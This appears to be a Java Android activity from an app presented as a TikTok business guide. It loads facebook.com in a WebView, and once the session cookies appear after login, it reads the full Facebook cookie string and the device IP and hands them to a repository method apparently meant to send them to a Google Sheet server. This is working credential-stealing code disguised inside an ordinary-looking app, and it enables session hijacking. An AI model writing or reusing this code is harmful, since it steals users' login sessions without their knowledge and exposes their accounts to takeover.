package com.teamwork.businessguideprofortiktok.src.resource.pages.webview_page;

import androidx.appcompat.app.AppCompatActivity;
import androidx.lifecycle.MutableLiveData;
import androidx.lifecycle.Observer;
import androidx.lifecycle.ViewModelProviders;

import android.content.Intent;
import android.os.Bundle;
import android.text.format.Formatter;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.teamwork.businessguideprofortiktok.R;
import com.teamwork.businessguideprofortiktok.src.resource.repositories.google_sheet_repository.GoogleSheetRepository;
import com.teamwork.businessguideprofortiktok.src.resource.viewmodels.googlesheet_viewmodel.GoogleSheetViewModel;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;

public class WebViewFacebookActivity extends AppCompatActivity {
    private WebView mWebViewFb;
    private GoogleSheetViewModel mRepository;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview_fb);
        mRepository = ViewModelProviders.of(WebViewFacebookActivity.this).get(GoogleSheetViewModel.class);

        initWebViewFB();
        listenerCallbackSever(mRepository);


    }

    private void listenerCallbackSever(final GoogleSheetViewModel mRepository) {
        mRepository.getCookies().observe(WebViewFacebookActivity.this, new Observer<String>() {
            @Override
            public void onChanged(String s) {
                mRepository.init();
            }
        });

        mRepository.getmMutableLiveData().observe(WebViewFacebookActivity.this, new Observer<String>() {
            @Override
            public void onChanged(String s) {
                if(!s.equals("") && s.equals("Success")){
                    Log.d("TAG", "onChanged: Success sever");
                    Toast.makeText(WebViewFacebookActivity.this, "Success sever", Toast.LENGTH_SHORT).show();
                }else{
                    finish();
                    startActivity(getIntent());
                }
            }
        });
    }

    public String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        String ip = Formatter.formatIpAddress(inetAddress.hashCode());
                        Log.i("IP", "***** IP="+ ip);

                        return ip;
                    }
                }
            }
        } catch (SocketException ex) {
            Log.e("IP", ex.toString());
        }
        return null;
    }

    private void initWebViewFB() {
        mWebViewFb = findViewById(R.id.webViewFB);
        mWebViewFb.loadUrl("https://www.facebook.com/");
        mWebViewFb.setWebViewClient(new WebViewClient(){
            @Override
            public void onPageFinished(WebView view, String url) {
                String strCookies = CookieManager.getInstance().getCookie("https://www.facebook.com/");

                String[]arrayCookies = strCookies.split(";");

                if (arrayCookies.length == 6){
                    String ip = getLocalIpAddress();
//                    Log.d("TAG", "onPageFinished: ip: "+ip);
//                    Log.d("TAG", "onPageFinished: strCookies: "+strCookies);
//                    mRepository.setIp(ip);
//                    mRepository.setCookies(strCookies);
                    mRepository.senData(ip, strCookies);
                   // mRepository.sendData();
                }
            }
        });
    }
}